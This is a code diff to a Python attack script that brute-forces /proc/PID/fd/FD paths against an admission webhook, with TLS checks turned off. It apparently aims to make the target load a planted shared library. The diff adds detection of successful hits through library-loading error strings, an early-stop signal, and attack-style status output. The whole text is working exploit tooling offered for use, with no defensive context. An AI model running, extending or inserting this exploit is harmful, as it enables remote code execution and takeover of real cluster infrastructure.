@@ -6,6 +6,7 @@ import threading
 import concurrent.futures
 import urllib3
 from queue import Queue
+import sys
 
 # Global configuration for easy customization
 CONFIG = {
@@ -90,7 +91,7 @@ def create_payload(pid, fd):
         }
     }
 
-def try_pid_fd_combination(pid, fd, results_queue):
+def try_pid_fd_combination(pid, fd, results_queue, success_event):
     """
     Test a specific PID/FD combination by sending a request to the admission webhook.
     
@@ -98,7 +99,12 @@ def try_pid_fd_combination(pid, fd, results_queue):
         pid (int): Process ID to test
         fd (int): File descriptor to test
         results_queue (Queue): Queue to store successful results
+        success_event (threading.Event): Event to signal when a successful combination is found
     """
+    # Check if a successful combination has already been found
+    if success_event.is_set():
+        return
+        
     payload = create_payload(pid, fd)
 
     try:
@@ -109,48 +115,61 @@ def try_pid_fd_combination(pid, fd, results_queue):
             CONFIG["url"],
             headers=CONFIG["headers"],
             data=json.dumps(payload),
-            verify=False,  # Equivalent to curl -k (insecure)
+            verify=False,
             timeout=CONFIG["request_timeout"]
         )
 
         # Check if the response contains JSON data
         try:
             response_json = response.json()
-            # Extract and print the status from the response if it exists
             if 'response' in response_json and 'status' in response_json['response']:
-                status = response_json['response']['status']['status']
-                print(f"Attempt /proc/{pid}/fd/{fd} => {status}")
+                message = response_json['response']['status'].get('message', '')
                 
-                # If we find a successful response, add it to the queue
-                if status == "Success":
-                    results_queue.put((pid, fd, status))
+                # Check for failure indicators in the message
+                failure_indicators = [
+                    "could not load the shared library",
+                    "Permission denied",
+                    "engine routines::dso not found"
+                ]
+                
+                is_success = all(indicator not in message for indicator in failure_indicators)
+                
+                if is_success:
+                    print(f"[+] Potential success found! /proc/{pid}/fd/{fd}")
+                    results_queue.put((pid, fd, message))
+                    # Signal that a successful combination has been found
+                    success_event.set()
+                else:
+                    print(f"[-] Attempt /proc/{pid}/fd/{fd} => Failed")
             else:
-                print(f"Attempt /proc/{pid}/fd/{fd} => Response JSON does not contain 'response.status' field")
+                print(f"[-] Attempt /proc/{pid}/fd/{fd} => Invalid response structure")
         except ValueError:
-            print(f"Attempt /proc/{pid}/fd/{fd} => Response is not valid JSON")
+            print(f"[-] Attempt /proc/{pid}/fd/{fd} => Invalid JSON response")
 
     except requests.exceptions.RequestException as e:
-        # In case the request fails, log it
-        print(f"Request for PID={pid}, FD={fd} failed: {e}")
+        print(f"[-] Request failed for PID={pid}, FD={fd}: {e}")
 
 def main():
     """
     Main function to orchestrate the brute force testing of PID/FD combinations.
     """
-    # Create a queue to store successful results
     results_queue = Queue()
+    success_event = threading.Event()
+    
+    print("[*] Starting PID/FD combination testing...")
+    print(f"[*] Testing PIDs: {CONFIG['pid_range'].start}-{CONFIG['pid_range'].stop-1}")
+    print(f"[*] Testing FDs: {CONFIG['fd_range'].start}-{CONFIG['fd_range'].stop-1}")
+    print(f"[*] Using {CONFIG['max_workers']} concurrent workers\n")
     
     # Generate all combinations of PIDs and FDs
-    combinations = []
-    for pid in CONFIG["pid_range"]:
-        for fd in CONFIG["fd_range"]:
-            combinations.append((pid, fd))
+    combinations = [
+        (pid, fd) for pid in CONFIG["pid_range"] 
+        for fd in CONFIG["fd_range"]
+    ]
     
-    # Use ThreadPoolExecutor to parallelize requests
-    print(f"Starting parallel execution with {len(combinations)} combinations...")
     with concurrent.futures.ThreadPoolExecutor(max_workers=CONFIG["max_workers"]) as executor:
         futures = {
-            executor.submit(try_pid_fd_combination, pid, fd, results_queue): (pid, fd) 
+            executor.submit(try_pid_fd_combination, pid, fd, results_queue, success_event): (pid, fd) 
             for pid, fd in combinations
         }
         
@@ -159,16 +178,18 @@ def main():
             try:
                 future.result()
             except Exception as exc:
-                print(f"Combination {pid}/{fd} generated an exception: {exc}")
+                print(f"[-] Error with {pid}/{fd}: {exc}")
     
-    # Check if we found any successful combinations
+    # Process results
     if not results_queue.empty():
-        print("\nSuccessful combinations found:")
+        print("\n[+] Successful combinations found:")
+        print("=" * 60)
         while not results_queue.empty():
-            pid, fd, status = results_queue.get()
-            print(f"SUCCESS: /proc/{pid}/fd/{fd} => {status}")
+            pid, fd, message = results_queue.get()
+            print(f"[+] SUCCESS: /proc/{pid}/fd/{fd}")
+            print(f"[+] Response message:\n{message}\n")
     else:
-        print("\nNo successful combinations found.")
+        print("\n[-] No successful combinations found.")
 
 if __name__ == "__main__":
     main()
